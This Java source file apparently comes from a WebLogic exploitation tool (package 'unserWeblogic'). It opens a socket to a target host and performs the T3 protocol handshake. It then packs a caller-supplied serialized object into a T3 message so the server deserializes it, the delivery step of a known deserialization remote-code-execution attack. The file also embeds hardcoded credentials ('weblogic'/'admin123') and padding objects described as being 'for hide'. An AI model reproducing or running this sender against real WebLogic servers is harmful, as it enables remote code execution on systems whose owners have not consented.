package unserWeblogic.T3;

import unserWeblogic.utils.BytesOperation;
import unserWeblogic.utils.Serializables;
import weblogic.rjvm.JVMID;
import weblogic.security.acl.internal.AuthenticatedUser;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.Socket;

public class T3 {
    public static void send(String host, String port, byte[] payload) throws Exception {
        Socket s = new Socket(host, Integer.parseInt(port));
        //AS ABBREV_TABLE_SIZE HL remoteHeaderLength 用来做skip的
//        String header = "t3 12.2.3\nAS:10\nHL:19\nnMS:10000000\n\n";
        String header = "t3 10.3.6\nAS:10\nHL:19\nnMS:10000000\n\n";

//        if (Main.cmdLine.hasOption("https")) {
//            header = "t3s 7.0.0.0\nAS:10\nHL:19\n\n";
//        }

        System.out.println("[INFO]: sending handshake packet ...");

        System.out.println("[INFO]: <<< Packet Content >>>");
        System.out.println(header);
        System.out.println("[INFO]: <<< Packet Content >>>");

        s.getOutputStream().write(header.getBytes());
        s.getOutputStream().flush();
        BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
        String versionInfo = br.readLine();
//        if (Main.version == null) {
//            versionInfo = versionInfo.replace("HELO:", "");
//            versionInfo = versionInfo.replace(".false", "");
//            System.out.println("weblogic version:" + versionInfo);
//            Main.version = versionInfo;
//        }
        String asInfo = br.readLine();
        String hlInfo = br.readLine();
        System.out.println("[INFO]: received handshake data");
        System.out.println("[INFO]: <<< Packet Content >>>");
        System.out.println(versionInfo+"\n"+asInfo+"\n"+hlInfo);
        System.out.println("[INFO]: <<< Packet Content >>>");

        //cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1

        //t3 protocol
        String cmd = "08";
        String qos = "65";
        String flags = "01";
        String responseId = "ffffffff";
        String invokableId = "ffffffff";
        String abbrevOffset = "00000000";
        String countLength = "01";
        String capacityLength = "10";//必须大于上面设置的AS值
        String readObjectType = "00";//00 object deserial 01 ascii

        StringBuilder datas = new StringBuilder();
        datas.append(cmd);
        datas.append(qos);
        datas.append(flags);
        datas.append(responseId);
        datas.append(invokableId);
        datas.append(abbrevOffset);

        //because of 2 times deserial
        countLength = "04";
        datas.append(countLength);

        //define execute operation
        String pahse1Str = BytesOperation.bytesToHexString(payload);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(pahse1Str);

        //for compatiable fo hide
        //for compatiable fo hide
        AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogic", "admin123");
        String phase4 = BytesOperation.bytesToHexString(Serializables.serialize(authenticatedUser));
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(phase4);

        JVMID src = new JVMID();

        Constructor constructor = JVMID.class.getDeclaredConstructor(InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        Field serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(src,1);

        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(src)));

        JVMID dst = new JVMID();

        constructor = JVMID.class.getDeclaredConstructor(InetAddress.class,boolean.class);
        constructor.setAccessible(true);
        src = (JVMID)constructor.newInstance(InetAddress.getByName("127.0.0.1"),false);
        serverName = src.getClass().getDeclaredField("differentiator");
        serverName.setAccessible(true);
        serverName.set(dst,1);
        datas.append(capacityLength);
        datas.append(readObjectType);
        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(dst)));

        byte[] headers = BytesOperation.hexStringToBytes(datas.toString());
        int len = headers.length + 4;
        String hexLen = Integer.toHexString(len);
        StringBuilder dataLen = new StringBuilder();

        if (hexLen.length() < 8) {
            for (int i = 0; i < (8 - hexLen.length()); i++) {
                dataLen.append("0");
            }
        }

        dataLen.append(hexLen);
        s.getOutputStream().write(BytesOperation.hexStringToBytes(dataLen + datas.toString()));
        s.getOutputStream().flush();
        s.close();

    }
}
